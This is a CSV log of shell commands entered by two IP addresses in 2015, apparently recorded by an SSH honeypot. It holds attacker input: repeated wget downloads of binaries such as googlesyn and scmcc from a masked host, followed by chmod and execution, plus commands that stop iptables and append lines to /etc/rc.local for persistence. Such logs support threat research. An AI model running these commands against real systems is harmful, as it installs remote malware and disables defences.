ip,timestamp,input
"222.186.34.75","2015-10-29 10:44:48","cd /tmp"
"222.186.34.75","2015-10-29 10:44:52","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 10:44:56","./googlesyn"
"222.186.34.75","2015-10-29 10:45:00","exit"
"222.186.34.75","2015-10-29 10:48:57","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 10:49:01","cd /tmp"
"222.186.34.75","2015-10-29 10:49:05","chmod 755 ./googleudp"
"222.186.34.75","2015-10-29 10:49:09","./googleudp"
"222.186.34.75","2015-10-29 10:49:13","exit"
"222.186.34.75","2015-10-29 10:54:17","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 10:54:21","cd /tmp"
"222.186.34.75","2015-10-29 10:54:25","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 10:54:29","./googlessd"
"222.186.34.75","2015-10-29 10:54:33","exit"
"222.186.34.75","2015-10-29 10:57:39","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 10:57:43","cd /tmp"
"222.186.34.75","2015-10-29 10:57:47","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 10:57:51","./googlesyn"
"222.186.34.75","2015-10-29 10:57:55","exit"
"222.186.34.75","2015-10-29 10:58:33","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 10:58:37","cd /tmp"
"222.186.34.75","2015-10-29 10:58:41","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 10:58:45","./googlesyn"
"222.186.34.75","2015-10-29 10:58:49","exit"
"222.186.34.75","2015-10-29 11:03:22","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 11:03:40","cd /tmp"
"222.186.34.75","2015-10-29 11:03:40","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 11:03:40","./googlessd"
"222.186.34.75","2015-10-29 11:03:40","exit"
"222.186.34.75","2015-10-29 11:03:41","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 11:03:44","cd /tmp"
"222.186.34.75","2015-10-29 11:03:48","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 11:03:52","./googlessd"
"222.186.34.75","2015-10-29 11:03:56","exit"
"222.186.34.75","2015-10-29 11:05:53","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 11:05:57","cd /tmp"
"222.186.34.75","2015-10-29 11:06:01","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 11:06:05","./googlessd"
"222.186.34.75","2015-10-29 11:06:09","exit"
"222.186.34.75","2015-10-29 11:14:59","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 11:15:03","cd /tmp"
"222.186.34.75","2015-10-29 11:15:36","chmod 755 ./googleudp"
"222.186.34.75","2015-10-29 11:15:37","./googleudp"
"222.186.34.75","2015-10-29 11:15:37","exit"
"222.186.34.75","2015-10-29 11:17:26","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 11:17:29","cd /tmp"
"222.186.34.75","2015-10-29 11:17:33","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 11:17:37","./googlesyn"
"222.186.34.75","2015-10-29 11:17:41","exit"
"222.186.34.75","2015-10-29 11:23:44","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 11:23:47","cd /tmp"
"222.186.34.75","2015-10-29 11:23:52","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 11:23:56","./googlesyn"
"222.186.34.75","2015-10-29 11:23:59","exit"
"222.186.34.75","2015-10-29 11:24:40","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 11:24:44","cd /tmp"
"222.186.34.75","2015-10-29 11:24:48","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 11:24:52","./googlessd"
"222.186.34.75","2015-10-29 11:24:56","exit"
"222.186.34.75","2015-10-29 11:27:29","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 11:27:48","cd /tmp"
"222.186.34.75","2015-10-29 11:27:48","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 11:27:48","./googlesyn"
"222.186.34.75","2015-10-29 11:27:48","exit"
"222.186.34.75","2015-10-29 11:27:48","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 11:27:52","cd /tmp"
"222.186.34.75","2015-10-29 11:27:56","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 11:28:00","./googlesyn"
"222.186.34.75","2015-10-29 11:28:04","exit"
"222.186.34.75","2015-10-29 11:33:02","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 11:33:06","cd /tmp"
"222.186.34.75","2015-10-29 11:33:10","chmod 755 ./googleudp"
"222.186.34.75","2015-10-29 11:33:14","./googleudp"
"222.186.34.75","2015-10-29 11:33:18","exit"
"222.186.34.75","2015-10-29 11:35:53","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 11:35:57","cd /tmp"
"222.186.34.75","2015-10-29 11:36:01","chmod 755 ./googleudp"
"222.186.34.75","2015-10-29 11:36:05","./googleudp"
"222.186.34.75","2015-10-29 11:36:09","exit"
"222.186.34.75","2015-10-29 11:37:53","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 11:37:56","cd /tmp"
"222.186.34.75","2015-10-29 11:38:01","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 11:38:05","./googlessd"
"222.186.34.75","2015-10-29 11:38:09","exit"
"222.186.34.75","2015-10-29 11:38:54","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 11:38:58","cd /tmp"
"222.186.34.75","2015-10-29 11:39:02","chmod 755 ./googleudp"
"222.186.34.75","2015-10-29 11:39:06","./googleudp"
"222.186.34.75","2015-10-29 11:39:10","exit"
"222.186.34.75","2015-10-29 11:47:16","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 11:47:20","cd /tmp"
"222.186.34.75","2015-10-29 11:47:24","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 11:47:38","./googlesyn"
"222.186.34.75","2015-10-29 11:47:38","exit"
"222.186.34.75","2015-10-29 11:47:39","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 11:47:42","cd /tmp"
"222.186.34.75","2015-10-29 11:47:47","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 11:47:50","./googlessd"
"222.186.34.75","2015-10-29 11:47:54","exit"
"222.186.34.75","2015-10-29 11:53:30","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 11:53:34","cd /tmp"
"222.186.34.75","2015-10-29 11:53:38","chmod 755 ./googleudp"
"222.186.34.75","2015-10-29 11:53:42","./googleudp"
"222.186.34.75","2015-10-29 11:53:45","exit"
"222.186.34.75","2015-10-29 12:03:44","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 12:03:48","cd /tmp"
"222.186.34.75","2015-10-29 12:03:52","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 12:03:56","./googlessd"
"222.186.34.75","2015-10-29 12:04:00","exit"
"222.186.34.75","2015-10-29 12:13:22","wget -O /tmp/googlessd http://***.***.***.***/googlessd"
"222.186.34.75","2015-10-29 12:13:25","cd /tmp"
"222.186.34.75","2015-10-29 12:13:29","chmod 755 ./googlessd"
"222.186.34.75","2015-10-29 12:13:33","./googlessd"
"222.186.34.75","2015-10-29 12:13:37","exit"
"222.186.34.75","2015-10-29 12:21:26","wget -O /tmp/googlesyn http://***.***.***.***/googlesyn"
"222.186.34.75","2015-10-29 12:21:30","cd /tmp"
"222.186.34.75","2015-10-29 12:21:34","chmod 755 ./googlesyn"
"222.186.34.75","2015-10-29 12:21:38","./googlesyn"
"222.186.34.75","2015-10-29 12:21:42","exit"
"222.186.34.75","2015-10-29 12:30:54","wget -O /tmp/googleudp http://***.***.***.***/googleudp"
"222.186.34.75","2015-10-29 12:30:57","cd /tmp"
"222.186.34.75","2015-10-29 12:31:01","chmod 755 ./googleudp"
"222.186.34.75","2015-10-29 12:31:05","./googleudp"
"222.186.34.75","2015-10-29 12:31:09","exit"
"59.46.10.155","2015-10-29 17:39:48","service iptables stop"
"59.46.10.155","2015-10-29 17:39:48","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-29 17:40:05","chmod 0777 scmcc"
"59.46.10.155","2015-10-29 17:40:09","chmod u+x scmcc"
"59.46.10.155","2015-10-29 17:40:13","./scmcc &"
"59.46.10.155","2015-10-29 17:40:17","chmod u+x scmcc"
"59.46.10.155","2015-10-29 17:40:21","./scmcc &"
"59.46.10.155","2015-10-29 17:40:25","cd /tmp"
"59.46.10.155","2015-10-29 17:40:30","service iptables stop"
"59.46.10.155","2015-10-29 17:40:34","wget http://***.***.***.***/scmcc"
"59.46.10.155","2015-10-29 17:40:46","chmod 777 scmcc"
"59.46.10.155","2015-10-29 17:40:49","./164"
"59.46.10.155","2015-10-29 17:40:54","chmod 0755 /root/scmcc"
"59.46.10.155","2015-10-29 17:40:58","nohup /root/scmcc &gt"
"59.46.10.155","2015-10-29 17:40:58","/dev/null 2&gt"
"59.46.10.155","2015-10-29 17:40:58","&amp"
"59.46.10.155","2015-10-29 17:40:58","1 &amp"
"59.46.10.155","2015-10-29 17:41:01","chmod 0777 scmcc"
"59.46.10.155","2015-10-29 17:41:05","chmod u+x scmcc"
"59.46.10.155","2015-10-29 17:41:09","./scmcc &"
"59.46.10.155","2015-10-29 17:41:13","chmod u+x dos6cc4"
"59.46.10.155","2015-10-29 17:41:17","./scmcc &"
"59.46.10.155","2015-10-29 17:41:21","cd /tmp"
"59.46.10.155","2015-10-29 17:41:26","echo \"cd  /root/\">>/etc/rc.local"
"59.46.10.155","2015-10-29 17:41:30","echo \"./scmcc&\">>/etc/rc.local"
"59.46.10.155","2015-10-29 17:41:33","echo \"./scmcc&\">>/etc/rc.local"
